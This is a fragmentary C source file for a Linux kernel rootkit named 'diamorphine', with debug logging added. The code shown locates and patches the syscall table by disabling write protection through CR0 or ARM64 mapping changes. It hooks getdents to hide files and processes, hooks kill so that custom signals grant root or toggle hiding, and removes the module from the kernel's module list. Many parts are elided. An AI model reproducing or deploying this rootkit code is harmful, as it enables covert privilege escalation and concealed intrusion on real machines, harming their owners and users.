...
unsigned long *get_syscall_table_bf(void) {
...
#ifdef KPROBE_LOOKUP
  LOG_INFO("Using kprobe method for kallsyms_lookup_name");
  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
  kallsyms_lookup_name_t kallsyms_lookup_name;

  LOG_INFO("Registering kprobe for kallsyms_lookup_name");
  ...
  LOG_INFO("kallsyms_lookup_name found at address: %p", kallsyms_lookup_name);
  unregister_kprobe(&kp);
  LOG_INFO("Unregistered kprobe");
#endif
  ...
  for (i = (unsigned long int)sys_close; i < ULONG_MAX; i += sizeof(void *)) {
    ...
    if (attempts % 1000000 == 0) {
      LOG_INFO("Brute force search attempt: %d, current address: 0x%lx",
                attempts, i);
    }
...
struct task_struct *find_task(pid_t pid) {
  LOG_FUNC_ENTRY();
  LOG_INFO("Searching for task with PID: %d", pid);
  ...
  for_each_process(p) {
    task_count++;
    if (p->pid == pid) {
      LOG_INFO("Found task with PID %d after checking %d tasks", pid,
                task_count);
      LOG_INFO("Task comm: %s", p->comm);
      LOG_FUNC_EXIT();
      return p;
    }
  }
...
int is_invisible(pid_t pid) {
  LOG_FUNC_ENTRY();
  LOG_INFO("Checking if PID %d is invisible", pid);
  struct task_struct *task;
  if (!pid) {
    LOG_INFO("PID is 0, returning not invisible");
    LOG_FUNC_EXIT_RET(0);
    return 0;
  }
  task = find_task(pid);
  if (!task) {
    LOG_INFO("Task not found for PID %d, returning not invisible", pid);
    LOG_FUNC_EXIT_RET(0);
    return 0;
  }
  if (task->flags & PF_INVISIBLE) {
    LOG_INFO("PID %d is invisible (flags: 0x%x)", pid, task->flags);
    LOG_FUNC_EXIT_RET(1);
    return 1;
  }
  LOG_INFO("PID %d is not invisible (flags: 0x%x)", pid, task->flags);
  LOG_FUNC_EXIT_RET(0);
  return 0;
}
...
#endif
  LOG_INFO("hacked_getdents64 called with fd=%d, dirent=%p", fd, dirent);
  int ret = orig_getdents64(pt_regs), err;
  LOG_INFO("Original getdents64 returned: %d", ret);
#else
asmlinkage int hacked_getdents64(unsigned int fd,
                                 struct linux_dirent64 __user *dirent,
                                 unsigned int count) {
  LOG_FUNC_ENTRY();
  LOG_INFO("hacked_getdents64 called with fd=%d, dirent=%p, count=%d", fd,
            dirent, count);
  ...
  if (ret <= 0) {
    LOG_INFO("getdents64 returned %d, no processing needed", ret);
    LOG_FUNC_EXIT_RET(ret);
    return ret;
  }

  LOG_INFO("Allocating %d bytes for kernel dirent buffer", ret);
  ...
  LOG_INFO("Copying %d bytes from user space", ret);
...
#endif
  LOG_INFO("Directory inode: ino=%lu, rdev=%d", d_inode->i_ino,
            d_inode->i_rdev);
  if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
      /*&& MINOR(d_inode->i_rdev) == 1*/) {
    proc = 1;
    LOG_INFO("Detected /proc directory, enabling process hiding");
  } else {
    LOG_INFO("Regular directory, using file hiding");
  }

  LOG_INFO("Processing dirent entries, total size: %d", ret);
  int hidden_count = 0;
  while (off < ret) {
    dir = (void *)kdirent + off;
    LOG_INFO("Processing entry: name='%s', reclen=%d, off=%lu", dir->d_name,
              dir->d_reclen, off);

    if ((!proc &&
         (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)) ||
        (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
      LOG_INFO("Hiding entry: '%s'", dir->d_name);
      hidden_count++;
      if (dir == kdirent) {
        ret -= dir->d_reclen;
        memmove(dir, (void *)dir + dir->d_reclen, ret);
        LOG_INFO("Removed first entry, new size: %d", ret);
        continue;
      }
      prev->d_reclen += dir->d_reclen;
      LOG_INFO("Merged with previous entry, new reclen: %d", prev->d_reclen);
    } else {
      prev = dir;
    }
    off += dir->d_reclen;
  ...
  LOG_INFO("Copying %d bytes back to user space", ret);
  err = copy_to_user(dirent, kdirent, ret);
  if (err) {
    LOG_ERROR("copy_to_user failed with error: %d", err);
    goto out;
  }
  LOG_INFO("Successfully copied data to user space");
out:
  LOG_INFO("Freeing kernel dirent buffer");
  kfree(kdirent);
  LOG_FUNC_EXIT_RET(ret);
  return ret;
}
...
static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
  ...
  struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->regs[1];
#endif
  LOG_INFO("hacked_getdents called with fd=%d, dirent=%p", fd, dirent);
  int ret = orig_getdents(pt_regs), err;
  LOG_INFO("Original getdents returned: %d", ret);
#else
asmlinkage int hacked_getdents(unsigned int fd,
                               struct linux_dirent __user *dirent,
                               unsigned int count) {
  LOG_FUNC_ENTRY();
  LOG_INFO("hacked_getdents called with fd=%d, dirent=%p, count=%d", fd,
            dirent, count);
  ...
  if (ret <= 0) {
    LOG_INFO("getdents returned %d, no processing needed", ret);
    LOG_FUNC_EXIT_RET(ret);
    return ret;
  }
...
void give_root(void) {
  ...
  LOG_INFO("Using legacy credential modification method");
...
#else
  LOG_INFO("Using modern credential modification method");
  ...
  LOG_INFO("Prepared new credentials at address: %p", newcreds);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) &&                           \
        defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) ||                           \
    LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
  LOG_INFO("Using strict type checks for UID/GID");
  newcreds->uid.val = newcreds->gid.val = 0;
  newcreds->euid.val = newcreds->egid.val = 0;
  newcreds->suid.val = newcreds->sgid.val = 0;
  newcreds->fsuid.val = newcreds->fsgid.val = 0;
#else
  LOG_INFO("Using standard UID/GID assignment");
  newcreds->uid = newcreds->gid = 0;
  newcreds->euid = newcreds->egid = 0;
  newcreds->suid = newcreds->sgid = 0;
  newcreds->fsuid = newcreds->fsgid = 0;
#endif
  LOG_INFO("Set all UIDs and GIDs to 0 (root)");
...
static inline void tidy(void) {
  LOG_FUNC_ENTRY();
  LOG_INFO("Cleaning up module section attributes");
  if (THIS_MODULE->sect_attrs) {
    LOG_INFO("Freeing module section attributes at address: %p",
              THIS_MODULE->sect_attrs);
    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;
    LOG_INFO("Module section attributes cleaned up");
  } else {
    LOG_INFO("No module section attributes to clean up");
  }
  LOG_FUNC_EXIT();
}
...
void module_show(void) {
  ...
  LOG_INFO("Module address: %p, name: %s", THIS_MODULE, THIS_MODULE->name);
  if (module_hidden) {
    LOG_INFO("Adding module back to module list at position: %p",
              module_previous);
    list_add(&THIS_MODULE->list, module_previous);
    module_hidden = 0;
    LOG_INFO("Module is now visible in module list");
  } else {
    LOG_INFO("Module is already visible, no action needed");
  }
  LOG_FUNC_EXIT();
}
...
void module_hide(void) {
  ...
  if (!module_hidden) {
    ...
    LOG_INFO("Stored previous module position: %p", module_previous);
    list_del(&THIS_MODULE->list);
    module_hidden = 1;
    LOG_INFO("Module is now hidden from module list");
  } else {
    LOG_INFO("Module is already hidden, no action needed");
  }
  LOG_FUNC_EXIT();
}
...
#endif
  LOG_INFO("hacked_kill called with pid=%d, signal=%d", pid, sig);
#else
asmlinkage int hacked_kill(pid_t pid, int sig) {
  ...
  case SIGINVIS:
    ...
    LOG_INFO("PID %d flags after toggle: 0x%x", pid, task->flags);
    break;
  case SIGSUPER:
  ...
  case SIGMODINVIS:
    ...
    if (module_hidden) {
      LOG_INFO("Module is currently hidden, making it visible");
      module_show();
    } else {
      LOG_INFO("Module is currently visible, hiding it");
      module_hide();
    }
    break;
  default:
    LOG_INFO("Standard kill signal %d, delegating to original handler", sig);
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
    LOG_FUNC_EXIT();
...
static inline void write_cr0_forced(unsigned long val) {
  LOG_INFO("Writing CR0 register with value: 0x%lx", val);
  unsigned long __force_order;

  asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
  LOG_INFO("CR0 register written successfully");
}
#endif
...
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
  LOG_INFO("Using x86/x86_64 memory protection (CR0: 0x%lx)", cr0);
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
...
#elif IS_ENABLED(CONFIG_ARM64)
  LOG_INFO("Using ARM64 memory protection");
  LOG_INFO("Updating mapping protection: phys=0x%lx, virt=0x%lx, size=0x%lx",
...
static inline void unprotect_memory(void) {
  ...
  LOG_INFO("Using x86/x86_64 memory unprotection (CR0: 0x%lx -> 0x%lx)", cr0,
            new_cr0);
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
...
#elif IS_ENABLED(CONFIG_ARM64)
  LOG_INFO("Using ARM64 memory unprotection");
  LOG_INFO("Updating mapping protection: phys=0x%lx, virt=0x%lx, size=0x%lx",
            __pa_symbol(start_rodata), (unsigned long)start_rodata,
            section_size);
  update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
...
static int __init diamorphine_init(void) {
  ...
  LOG_INFO("Attempting to locate syscall table");
...
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
  LOG_INFO("Reading CR0 register for x86/x86_64");
  cr0 = read_cr0();
  LOG_INFO("CR0 register value: 0x%lx", cr0);
#elif IS_ENABLED(CONFIG_ARM64)
  LOG_INFO("Setting up ARM64 memory protection functions");
  ...
  LOG_INFO("update_mapping_prot found at: %p", update_mapping_prot);
  ...
  LOG_INFO("__start_rodata found at: 0x%lx", start_rodata);
  ...
  LOG_INFO("__init_begin found at: 0x%lx", init_begin);
  LOG_INFO("Section size: 0x%lx", section_size);
#endif

  LOG_INFO("Hiding module from module list");
  module_hide();

  LOG_INFO("Cleaning up module attributes");
  tidy();

  LOG_INFO("Storing original syscall handlers");
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
  ...
  LOG_INFO("Disabling memory protection to modify syscall table");
  unprotect_memory();
  ...
  LOG_INFO("Re-enabling memory protection");
  protect_memory();
...
static void __exit diamorphine_cleanup(void) {
  ...
  LOG_INFO("Disabling memory protection to restore syscall table");
  unprotect_memory();
